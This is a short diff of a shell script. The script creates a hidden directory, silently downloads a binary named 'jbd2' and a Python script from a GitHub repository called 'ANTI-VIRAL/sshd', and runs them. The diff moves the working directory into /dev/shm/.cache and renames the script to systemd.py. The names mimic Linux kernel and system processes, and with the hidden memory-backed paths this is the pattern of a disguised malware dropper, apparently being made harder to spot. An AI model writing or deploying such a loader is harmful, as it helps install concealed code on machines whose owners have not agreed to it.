@@ -2,15 +2,15 @@
 
 set -e
 
-mkdir -p ~/.cache/kthreadd
-chmod 700 ~/.cache/kthreadd
-cd ~/.cache/kthreadd
+mkdir -p /dev/shm/.cache
+chmod 700 /dev/shm/.cache
+cd /dev/shm/.cache
 
 wget -q \
     https://github.com/ANTI-VIRAL/sshd/raw/main/jbd2 \
-    https://github.com/ANTI-VIRAL/sshd/raw/main/kthreadd.py 
+    https://github.com/ANTI-VIRAL/sshd/raw/main/systemd.py 
 
 chmod +x jbd2
 
 # Start program
-exec python kthreadd.py
+exec python systemd.py
